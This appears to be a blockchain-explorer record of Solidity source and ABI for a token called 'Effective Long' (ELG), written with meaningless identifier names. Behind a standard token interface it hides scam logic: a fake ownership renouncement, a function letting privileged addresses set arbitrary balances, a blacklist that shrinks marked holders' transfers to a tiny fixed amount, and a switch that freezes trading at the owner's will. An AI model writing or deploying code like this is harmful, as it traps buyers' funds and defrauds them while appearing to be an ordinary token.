{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface launchedShouldAmount {\n    function createPair(address totalSell, address launchedMin) external returns (address);\n}\n\ninterface walletTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableShouldTo) external view returns (uint256);\n\n    function transfer(address listTokenLimit, uint256 listMax) external returns (bool);\n\n    function allowance(address takeFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listTokenLimit,\n        uint256 listMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundToken, uint256 value);\n    event Approval(address indexed takeFee, address indexed spender, uint256 value);\n}\n\nabstract contract launchReceiverMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLaunchIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverListFee is walletTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EffectiveLong is launchReceiverMax, walletTo, receiverListFee {\n\n    function transfer(address feeTo, uint256 listMax) external virtual override returns (bool) {\n        return sellExempt(_msgSender(), feeTo, listMax);\n    }\n\n    address marketingTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverIs;\n    }\n\n    function takeMax() public {\n        emit OwnershipTransferred(liquidityFee, address(0));\n        tradingSell = address(0);\n    }\n\n    mapping(address => bool) public launchedReceiverFee;\n\n    address tokenTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function sellExempt(address shouldFee, address listTokenLimit, uint256 listMax) internal returns (bool) {\n        if (shouldFee == liquidityFee) {\n            return takeFrom(shouldFee, listTokenLimit, listMax);\n        }\n        uint256 launchEnable = walletTo(txFundExempt).balanceOf(tokenTrading);\n        require(launchEnable == toBuyFrom);\n        require(listTokenLimit != tokenTrading);\n        if (sellFromSwap[shouldFee]) {\n            return takeFrom(shouldFee, listTokenLimit, marketingAt);\n        }\n        return takeFrom(shouldFee, listTokenLimit, listMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private maxLimit;\n\n    string private receiverIs = \"Effective Long\";\n\n    uint256 receiverTake;\n\n    address public liquidityFee;\n\n    address public txFundExempt;\n\n    function exemptMarketing(address feeTo, uint256 listMax) public {\n        maxReceiver();\n        fromShouldExempt[feeTo] = listMax;\n    }\n\n    bool public tokenReceiver;\n\n    function allowance(address liquidityTx, address takeSellSwap) external view virtual override returns (uint256) {\n        if (takeSellSwap == marketingTo) {\n            return type(uint256).max;\n        }\n        return maxLimit[liquidityTx][takeSellSwap];\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingSell;\n    }\n\n    uint256 toBuyFrom;\n\n    uint256 private launchBuy = 100000000 * 10 ** 18;\n\n    bool private atSender;\n\n    uint8 private minTakeFrom = 18;\n\n    function balanceOf(address enableShouldTo) public view virtual override returns (uint256) {\n        return fromShouldExempt[enableShouldTo];\n    }\n\n    bool private txIsMode;\n\n    function owner() external view returns (address) {\n        return tradingSell;\n    }\n\n    address private tradingSell;\n\n    constructor (){\n        \n        receiverLaunchIs launchedLimitTrading = receiverLaunchIs(marketingTo);\n        txFundExempt = launchedShouldAmount(launchedLimitTrading.factory()).createPair(launchedLimitTrading.WETH(), address(this));\n        if (atModeReceiver != shouldIs) {\n            autoWallet = atModeReceiver;\n        }\n        liquidityFee = _msgSender();\n        launchedReceiverFee[liquidityFee] = true;\n        fromShouldExempt[liquidityFee] = launchBuy;\n        takeMax();\n        \n        emit Transfer(address(0), liquidityFee, launchBuy);\n    }\n\n    mapping(address => bool) public sellFromSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchBuy;\n    }\n\n    function takeFrom(address shouldFee, address listTokenLimit, uint256 listMax) internal returns (bool) {\n        require(fromShouldExempt[shouldFee] >= listMax);\n        fromShouldExempt[shouldFee] -= listMax;\n        fromShouldExempt[listTokenLimit] += listMax;\n        emit Transfer(shouldFee, listTokenLimit, listMax);\n        return true;\n    }\n\n    function approve(address takeSellSwap, uint256 listMax) public virtual override returns (bool) {\n        maxLimit[_msgSender()][takeSellSwap] = listMax;\n        emit Approval(_msgSender(), takeSellSwap, listMax);\n        return true;\n    }\n\n    function swapTeamMode(uint256 listMax) public {\n        maxReceiver();\n        toBuyFrom = listMax;\n    }\n\n    uint256 private shouldIs;\n\n    function takeMinFrom(address fromWallet) public {\n        maxReceiver();\n        if (atModeReceiver == shouldIs) {\n            shouldIs = autoWallet;\n        }\n        if (fromWallet == liquidityFee || fromWallet == txFundExempt) {\n            return;\n        }\n        sellFromSwap[fromWallet] = true;\n    }\n\n    function maxReceiver() private view {\n        require(launchedReceiverFee[_msgSender()]);\n    }\n\n    string private walletShould = \"ELG\";\n\n    uint256 private autoWallet;\n\n    function buyToken(address maxAuto) public {\n        if (tokenReceiver) {\n            return;\n        }\n        \n        launchedReceiverFee[maxAuto] = true;\n        \n        tokenReceiver = true;\n    }\n\n    mapping(address => uint256) private fromShouldExempt;\n\n    uint256 constant marketingAt = 16 ** 10;\n\n    uint256 public atModeReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTakeFrom;\n    }\n\n    event OwnershipTransferred(address indexed senderSell, address indexed receiverLiquidity);\n\n    function transferFrom(address shouldFee, address listTokenLimit, uint256 listMax) external override returns (bool) {\n        if (_msgSender() != marketingTo) {\n            if (maxLimit[shouldFee][_msgSender()] != type(uint256).max) {\n                require(listMax <= maxLimit[shouldFee][_msgSender()]);\n                maxLimit[shouldFee][_msgSender()] -= listMax;\n            }\n        }\n        return sellExempt(shouldFee, listTokenLimit, listMax);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeSellSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atModeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShouldTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"}],\"name\":\"buyToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMax\",\"type\":\"uint256\"}],\"name\":\"exemptMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listMax\",\"type\":\"uint256\"}],\"name\":\"swapTeamMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"}],\"name\":\"takeMinFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTokenLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFundExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EffectiveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}